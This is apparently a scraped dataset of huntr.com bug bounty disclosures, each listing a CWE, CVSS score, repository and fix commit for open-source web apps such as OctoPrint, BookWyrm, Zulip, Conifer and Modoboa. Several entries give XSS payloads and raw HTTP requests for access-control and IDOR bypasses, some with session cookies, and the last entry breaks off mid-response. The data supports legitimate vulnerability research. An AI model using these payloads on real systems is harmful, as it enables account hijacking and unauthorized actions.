"https://huntr.com/bounties/441cc44c-6837-46ec-9b30-52455aa71a2f/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Generic", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (4.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/spiral-project/ihatemoney", "fix_commit": "https://www.github.com/spiral-project/ihatemoney/commit/667b65b9ccb5c68c2f251be12d6aa3d06cdcb0ba", "description": "Description\nihatemoney is vulnerable to Cross-Site Scripting (XSS) when inviting people via email.\nSteps to reproduce\n1.Go to https://ihatemoney.org/ and try out the demo.\n2.In the bottom left, click on Invite people.\n3.In the Send via Emails section, input the payload: <img src=x onerror=alert(document.domain)> into the People to notify field.\n4.Click the Send the invitations button and you will see that a pop-up will display.\nImpact\nThis vulnerability has the potential to deface websites, result in compromised user accounts, and can run malicious code on web pages, which can lead to a compromise of the user\u2019s device."}, "https://huntr.com/bounties/057ece78-7f0d-47be-a7aa-755fa3c0ff84/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Generic", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in supplier company name field.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/1KDrwbWkftO-cNrd-4XSoNh_27Z3vqiMR/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/22783cd3-1b2c-48fc-b31f-03b53c86da0b/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Generic", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in part revision field.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/1ZobGHiFXbhPG_0agsH8mcg8VMsrjSuUP/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/cb545c63-a3c1-4d57-8f06-e4593ab389bf/": {"cve": "CVE-2022-1432", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1432", "cwe": "CWE-79: Cross-site Scripting (XSS) - Generic", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/6d259d7e6f5b0de9a1c762831537a386e53978d3", "description": "Description\nThe Stream URL of octoprint application allowing xss payload to execute for which its leads to Cross-site Scripting (XSS\nProof of Concept\nLogin to the application\nNow go to settings -> Webcam & Timelapse -> Stream URL and insert the payload \"<img src=1 onerror=alert(document.cookie)> in the Stream URL and click on \"Test\"\nYou will see that its making a internal GET request\nImage POC\nhttps://drive.google.com/drive/folders/1gvRKz8AKOY8XE3O3z4mJdr61heIxGtH7?usp=sharing\nImpact\nUser accounts can be hijacked, credentials could be stolen, sensitive data could be exfiltrated, and lastly, access to your client computers can be obtained."}, "https://huntr.com/bounties/e6fb1931-8d9c-4895-be4a-59839b4b6445/": {"cve": "CVE-2022-4724", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4724", "cwe": "CWE-284: Improper Access Control", "cwe_link": "https://cwe.mitre.org/data/definitions/284.html", "severity_score": "High (8.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/c4a19cf67d575c4886171b8efcbf4675d51f3929", "description": "Description\nWith SSH keys, you can connect to Rdiffweb without supplying your username and personal access token at each visit. Rdiffweb allows the same SSH key to be used by multiple users . For Example: User A has used SSH key '1' , the same key can be used by User B , User C . The application is identifying a duplicate SSH key via SSH key name that is only a title to identify the key and not the actual SSH key.\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/sshkeys# \n2) Login into account 'A' .Create an SSH key , name it as TEST\n3) Login into account 'B'. Create SSH key using the same public key , just name it as BEST\n\nNote: if you use the same name - TEST then , it will say that this key is duplicate . The application is identifying duplicates through the name and not the key.\n\n\n\n\n# Impact\n\nThis issue gives rise to a Broken access control vulnerability"}, "https://huntr.com/bounties/163fa262-19f2-4625-98a0-badda715f195/": {"cve": "", "cve_link": "", "cwe": "CWE-284: Improper Access Control", "cwe_link": "https://cwe.mitre.org/data/definitions/284.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/1f93dc9c62f91e3f7f537fa0c12949c52e7eb579", "description": "Description\nIn this case if a userA block userB. UserB is still able to send private message to user A\nProof of Concept\n1.USerA block userB \n2.UserB send direct request to message endpoint with userA''s userID\n\n\n# Poc\nPOST https://bookwyrm.social/post/direct\nHost: bookwyrm.social\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://bookwyrm.social/direct-messages/alizo2\nContent-Type: multipart/form-data; boundary=---------------------------63531825311408735291403048175\nOrigin: https://bookwyrm.social\nContent-Length: 940\nDNT: 1\nConnection: keep-alive\nCookie: csrftoken=; django_language=None; sessionid=suokqtn2cfu01jpoys18vni112ndmzjr\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nTE: trailers\nPragma: no-cache\nCache-Control: no-cache\n\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\n\ntoken\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"book\"\n\n\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"user\"\n\nid\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"reply_parent\"\n\n\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"content\"\n\n@Victim's Username   message\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"content_warning\"\n\n\n-----------------------------63531825311408735291403048175\nContent-Disposition: form-data; name=\"privacy\"\n\ndirect\n-----------------------------63531825311408735291403048175--\n\n\n\n# Impact\n\nSending message to a user even if he blocked  a specific user "}, "https://huntr.com/bounties/43a1669e-0c37-4305-b640-2abb7d536e34/": {"cve": "", "cve_link": "", "cwe": "CWE-284: Improper Access Control", "cwe_link": "https://cwe.mitre.org/data/definitions/284.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/e5611c7c034ee2694e473add0b557887532156b7", "description": "Description\nInsecure direct object references when creating a list allows one user to create a new list on behalf of another.\nProof of Concept\nPOST /user/alizo@bookwyrm.social/groups HTTP/2\nHost: bookwyrm.social\nCookie: csrftoken=; django_language=None; sessionid=\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://bookwyrm.social/user/alizo/groups\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 137\nOrigin: https://bookwyrm.social\nDnt: 1\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\ncsrfmiddlewaretoken=token&user=victim'suserid&name=idor&description=idor&privacy=public\nSteps to repro:-\n1.Login with user1 account then go to Profile page.\n2.Go to the groups tab then create a new group.\n3.Intercept the request, in the body content, change the value of user from user1_id to user2_id then forward the request.\n4.You will see that a new group is create in user2 account instead of user1 account.\nImpact\nThis vulnerability is capable of allows a user to create a group on other users' accounts, affecting the logic of the application."}, "https://huntr.com/bounties/2928a625-0467-4a0a-b4e2-e27322786686/": {"cve": "CVE-2021-3967", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3967", "cwe": "CWE-284: Improper Access Control", "cwe_link": "https://cwe.mitre.org/data/definitions/284.html", "severity_score": "Medium (4.1)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/zulip/zulip", "fix_commit": "https://www.github.com/zulip/zulip/commit/d5db254ca8167995a1654d1c45ffc74b2fade39a", "description": "Description\nAccording to the current design of the application, when the user wants to get value of api_key, API /json/fetch_api_key will require password to authentication. However, the application exists another API routed at /json/users/me/api_key/regenerate that allows regenerating api_key value and doesn't requiring password authentication. Attacker who gets the user's valid session can call vulnerable API to extract the api_key value without user's password.\nProof of Concept\nI'm using online service at https://testingnnnn.zulipchat.com.\nStep 1: Login as normal user, go to https://testingnnnn.zulipchat.com/#settings/account-and-privacy, click \"Show/change your API key\", application will ask for password to perform the action.\nStep 2: In current session, call this request to regenerate and get value of api_key\nPOST /json/users/me/api_key/regenerate HTTP/2\nHost: testingnnnn.zulipchat.com\nCookie: [YOUR_VALID_COOKIE]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-Csrftoken: [VALID_CSRF_TOKEN]\nX-Requested-With: XMLHttpRequest\nReferer: https://testingnnnn.zulipchat.com/\nConnection: close\nPoC:\nShow api_key: https://drive.google.com/file/d/1_A7KQeoyByA3xYwIyJ1k9ZTywabwlEMM\nRegenerate api_key: https://drive.google.com/file/d/1Ob96FTju4irz2Hn2sXBXz_JtMlEAmAp0\nImpact\nBypass the protection mechanism in the design of the application. Attackers can get the api_key value without knowing user's password."}, "https://huntr.com/bounties/8229e51c-02f6-43bf-a75d-001cc6fc7524/": {"cve": "", "cve_link": "", "cwe": "CWE-284: Improper Access Control", "cwe_link": "https://cwe.mitre.org/data/definitions/284.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/6512ab7542c96364f593b9be221cdc74ecfa6a0d", "description": "Description\n\"form_valid\" function in comments/views.py file performs the task of saving user comments. However, this function doesn't check the status of article, so users can leave comments on draft article or public article with commentstatus is off.\nProof of Concept\nStep 1: Login as admin in test product and go to http://localhost:8000/admin/blog/article/. Change status of article ID 19 to draft_article (\u9009\u4e2d\u6587\u7ae0\u8bbe\u7f6e\u4e3a\u8349\u7a3f) or close_article_commentstatus (\u5173\u95ed\u6587\u7ae0\u8bc4\u8bba)\nStep 2: Login as normal user (http://localhost:8000/login) and get valid csrftoken, sessionid, csrfmiddlewaretoken.\nStep 3: Call request and create comment in draft article or public article with commentstatus is off\nPOST /article/19/postcomment HTTP/1.1\nHost: 127.0.0.1:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 181\nOrigin: http://127.0.0.1:8000\nDNT: 1\nConnection: close\nCookie: csrftoken=2iccWTWyKBM4cm0Ii6BkrTOJ2xNdMox6JUP1zlchmG6eUJSkOCXgklgJwuuih5ia; sessionid=pg009zo7zl35ssyk4fsufv64wplpldp9\nUpgrade-Insecure-Requests: 1\n\ncsrfmiddlewaretoken=8uHhc1GS64fgzOap298PemIde25fymtrP6k6PtWBI9zqhb21yFuL7OadIZMk33ev&body=comment_in_post_19_disabled&parent_comment_id=&submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA\nStep 4: In admin browser, go to http://localhost:8000/admin/comments/comment/ and check result.\nPoC:\nComment in article disabled: https://drive.google.com/file/d/1nD-lbe1aDxATfvJNyX5R81x2aH_4nddl/view?usp=sharing\nSend comment: https://drive.google.com/file/d/1wJMdUxhTAB1OGR9pJNG1qayZGcMl_quM/view?usp=sharing\nResult: https://drive.google.com/file/d/1ODJRC3SL2rV0dnOdQRLaa_7x9rG0S3zd/view?usp=sharing\nImpact\nNormal users can leave comments on draft article or public article with commentstatus is off. Attacker can also take advantage of the vulnerability to list the id of articles in draft mode. Run comment spam attack even if the app has disabled comments for all articles."}, "https://huntr.com/bounties/b2dc504d-92ae-4221-a096-12ff223d95a8/": {"cve": "CVE-2022-4314", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4314", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Medium (6)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b2df3679564d0daa2856213bb307d3e34bd89a25", "description": "Hey,\nAttack Scenario:\nAdmin setups new user with User privileges and gives access to repos \"/\" root directory, after a time due to some reason he revoke the privileges of the directory access but user privileged attacker can still edit settings , check logs and view history without having permissions.\nSteps To reproduce:\nFrom Admin's account make a new user with least privileges and give him access to root directory \"/\" Change the Root directory to blank and revoke the access to root directory. Go to User's account, if you will try to access browse it will give you 403 but if you directly access it via For example \"backups/MyWindowsLaptop/C\" : https://rdiffweb-demo.ikus-soft.com/browse/{user-account}/backups/MyWindowsLaptop/C it will give you 403 but if we try to access it via https://rdiffweb-demo.ikus-soft.com/settings/{user-account}/backups/MyWindowsLaptop/C https://rdiffweb-demo.ikus-soft.com/logs/{user-account}/backups/MyWindowsLaptop/C https://rdiffweb-demo.ikus-soft.com/history/{user-account}/backups/MyWindowsLaptop/C https://rdiffweb-demo.ikus-soft.com/graphs/activities/{user-account}/backups/MyWindowsLaptop/C\neven if attacker can't view it directly but he can perform all the functionalities which were supposed to be revoked like downliad, history , edit settings , graphs , logs , etc.\nIf the Attacker's account had Manager privileges he can also delete the repo. Same scenario with Manager account too.\nPOC: https://docs.google.com/document/d/1b9uMYyL6n6Js0Aw55ehsh9skQdJ1Q3D52Ve3bqTI9_A/\nImpact\nUnauthorized actions can be done by attacker's account, even after removing the permissions. Attacker can read , access , edit and in manager's case he can delete that too."}, "https://huntr.com/bounties/f45c24cb-9104-4c6e-a9e1-5c7e75e83884/": {"cve": "CVE-2022-3068", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3068", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Medium (5.3)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/ef95ef1c101b79394f134e8fce000e6bae046571", "description": "Overview of the Vulnerability\nAuthentication and session management controls can be bypassed in a variety of ways including, calling an internal post-authentication page, modifying the given URL parameters, by manipulating the form, or by counterfeiting sessions. The authentication method for this application can be bypassed by an attacker which enables them to access a privileged user\u2019s account and functionality, giving them access to more resources or functionality within the application. This could include viewing or editing sensitive customer data, and viewing or editing other user permissions.\nBusiness Impact\nThe impact of privilege escalation through broken authentication controls can vary in severity depending on the degree of access to resources or functionality the malicious attacker is able to gain. An attacker with the ability to access, delete, or modify data from within the application could result in reputational damage for the business through the impact on customers\u2019 trust. This can also result in indirect financial costs to the business through fines and regulatory bodies if sensitive data is accessed. The severity of the impact on the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.\nSummary\nLower privileged user (Read-only Access user) is not allowed to Edit/Take action in plugin management section , Only Admin users (Users with privileges) are allowed to Edit/Take action on it but from the Direct Request, a Lower privileged user (Read-only Access user) can Edit the admin Environment by enabling/disabling/Cleanup plugins without privileges\nAs mentioned in the website : Read-only Access Group to gain read-only access Plugin Manager: List plugins (ONLY)\nProof of Concept\nSend the following request using burp proxy using read-only user cookies\nNote : you can change the command to (enable /disable/ cleanup) and this could be applied for all plugins (*That's why availability is High in CVSS)\nPOST /api/plugin/pluginmanager HTTP/1.1 Host: localhost:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 Accept: application/json, text/javascript, /; q=0.01 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=UTF-8 Cache-Control: no-cache X-Requested-With: XMLHttpRequest Content-Length: 43 Origin: http://localhost:5000 Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cookie: session_P5000= {{ Read-only access user cookies }}\n{\"plugin\":\"corewizard\",\"command\":\"disable\"}\nImpact\nLower privileged user (Read-only Access user) can Edit the admin environment by enabling/disabling/Cleanup plugins without privileges"}, "https://huntr.com/bounties/8d75f43a-a510-46fc-8dbf-10a3d09c51c6/": {"cve": "", "cve_link": "", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Critical (9.9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/44b86baa5b52580cc1c5122bdc808ba9c21cebf4", "description": "Description\nInsecure direct object references in create-shelf function allows one user to create a shelf on behalf of another.\nProof of Concept\nPOST /create-shelf HTTP/2\nHost: book.dansmonorage.blue\nCookie: csrftoken=ZpIuGbCcxOyhta5bki4N46N7vknEAcpaG3881kcMAfWKBEYKEiLEeSc3Sr4lUTVa; django_language=en-us; sessionid=eehh5ghe5q98xephiv46onn3jixdgx7p\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://book.dansmonorage.blue/user/nhienit2010/books\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 156\nOrigin: https://book.dansmonorage.blue\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\ncsrfmiddlewaretoken=aCHsAiZx3GMVTl4XkpU7hpChuv6mePSLRg76Vrz767ao1PXwEpBYrb1dRCN3ywoL&user=<others id>&name=from-other-user&description=133123123123&privacy=public\nPoC Image\nImpact\nThis vulnerability is capable of allows a user to create new shelves on other users' accounts, affecting the logic of the application."}, "https://huntr.com/bounties/c3ae35ec-11e9-41cf-aeed-8938b1d7b778/": {"cve": "", "cve_link": "", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rhizome-conifer/conifer", "fix_commit": "https://www.github.com/rhizome-conifer/conifer/commit/76ed5afe1b61ab507de3012e489ee26a637624e6", "description": "Description\nIn admincontroller.py file, all APIs will perform user permission checks using admin_view function to avoid access from low-level users. However, this does not apply to API /api/v1/admin/defaults. Anonymous users can change max_size configuration which prevents other users from creating records.\nProof of Concept\nStep 1: First, I create two accounts asdmigs78j56436 and asdmigs78j56436. When retrieving information from the API /api/v1/auth/curr_user, the value of max_size variable is 500000000.\nStep 2: Set value for max_size via API /api/v1/admin/defaults\nPUT /api/v1/admin/defaults HTTP/2\nHost: conifer.rhizome.org\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\nAccept: */*\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 56\nConnection: close\n\n{\"max_size\":\"1000\",\n\"max_anon_size\":\"1000\"}\nStep 3: Create new account asdmigs78j56437. When retrieving information from the API /api/v1/auth/curr_user, the value of max_size variable is 1000. Create a new record, you will very quickly reach the maximum limit.\nNote: I adjusted max_size back to the original value of 500000000\nPoC:\nReal max_size: https://drive.google.com/file/d/1JEo6MY-TGEfAUSalQwzegpOlbyukaF7p/view?usp=sharing\nChange max_size: https://drive.google.com/file/d/1kfHhIDnC-coQ_AjZzRG5uY8PfYVjRpmU/view?usp=sharing\nReach limit: https://drive.google.com/file/d/1bMVclDzfQzsnzPIOeazC_zn7s2N7ka0r/view?usp=sharing\nImpact\nImproper Privilege Management. Anonymous users can change max_size configuration which prevents other users from creating records."}, "https://huntr.com/bounties/2dffbae2-07c6-431a-8e74-889333411f77/": {"cve": "", "cve_link": "", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Medium (5.9)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/e37109010f247167344ff7bd14eb1a91d8b86742", "description": "Description\nHi there, I would like to report an improper privilege management vulnerability in djangoblog source code. This would allow an attacker to create comment on behalf of anyone.\nProof of Concept\nInstall a local instance of djangoblog, login as admin and create an article\nCreate a new user called user1\nLogin as user1 and create a comment\nUse a tool like Burp Suite to capture the request and repeat it with an empty sessionid, change name and email in body to admin and admin@gmail.com (the username and email of admin).\nSee that a new comment is created on behalf of admin user\nThe reason for this is this block of code in file comments/views.py\n        if not self.request.user.is_authenticated:\n            email = form.cleaned_data['email']\n            username = form.cleaned_data['name']\n\n            user = get_user_model().objects.get_or_create(\n                username=username, email=email)[0]\n        comment = form.save(False)\n        comment.article = article\n\n        comment.author = user\nIf the user is not authenticated, then email and username is taken from request body and saved as comment author.\nImpact\nThis vulnerability is capable of allowing attacker to create comments on behalf of others."}, "https://huntr.com/bounties/4400a7d8-5934-4fe5-bf93-ccbb97edd818/": {"cve": "", "cve_link": "", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rhizome-conifer/conifer", "fix_commit": "https://www.github.com/rhizome-conifer/conifer/commit/955948b0225c1d7498f83e7da8c592f69d077beb", "description": "Description\nHi there, I would like to report an improper privilege escalation in conifer. Any user can view all recordings of other users.\nProof of Concept\nGo to https://conifer.rhizome.org/ and register 2 accounts, let's call it user1 and user2\nUse user1 and create a collection, let's name this collection1\nLogin as user2 and go to this link https://conifer.rhizome.org/api/v1/recordings?user=<user1>&coll=collection1\nSee that you can view all recordings of user1.\nImpact\nThis vulnerability is capable of viewing all users recordings."}, "https://huntr.com/bounties/359bea50-2bc6-426a-b2f9-175d401b1ed0/": {"cve": "CVE-2022-0338", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0338", "cwe": "CWE-269: Improper Privilege Management", "cwe_link": "https://cwe.mitre.org/data/definitions/269.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/delgan/loguru", "fix_commit": "https://www.github.com/delgan/loguru/commit/ea39375e62f9b8f18e2ca798a5c0fb8c972b7eaa", "description": "BUG\nunprivileged user can see log file and sensitive information disclosed\nSUMMURY\nloguru create log file to store the log . Log may contain many sentsitive information like username,password,token,key etc .\nSo, this log file should not accessed by other user .\nBut when loguru create log file then file permission is -rw-rw-r-- 1 user user 345 Jan 11 14:47 combined.log which can be access by any user.\nIn linux system there may be many user with different privileged . but any user can see this log file .\nSTEP TO RERPODUCE\nrun bellow code\nfrom loguru import logger\ndata=\"Data to be logged , password123 is incorrect\" #sensitive data logging\nlogger.add(\"combined.log\") #creating log file with insecure permission\nlogger.info(data)\nNow a combined.log file will be created with all log information . check file permission\nuser@user-xx:~$ ls -lh combined.log\n-rw-rw-r-- 1 user user 345 Jan 11 14:47 combined.log\nSo, this file has read permission for all system user . Thus any user can read this log file .I see mostly all webserver , logger etc log there info in a file and it is only accessed by current user who created the file . But in this case it has read permission for all user .\nSUGGESTED FIX\nYou should change the logfile permision to be access only by current user who crated the file or sudo user ."}, "https://huntr.com/bounties/351f9055-2008-4af0-b820-01ff66678bf3/": {"cve": "CVE-2023-2227", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2227", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/7bcd3f6eb264d4e3e01071c97c2bac51cdd6fe97", "description": "Description\nDuring testing, it was observed that sending a GET request to the following endpoint: /api/v2/parameters/core/ returns sensitive information without any authentication or authorization.\nRequest\nGET /api/v2/parameters/core/ HTTP/1.1\nHost: demo.modoboa.org\nUser-Agent: 7h3h4ckv157\nAccept: application/json, text/plain, */*\nAccept-Language: en\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nContent-Length: 0\nConnection: close\nResponse\nHTTP/1.1 200 OK\nServer: nginx/1.14.2\nDate: Sat, 25 Feb 2023 03:26:58 GMT\nContent-Type: application/json\nContent-Length: 1709\nConnection: close\nVary: Accept, Accept-Language, Cookie\nAllow: GET, PUT, HEAD, OPTIONS\nX-Frame-Options: SAMEORIGIN\nContent-Language: 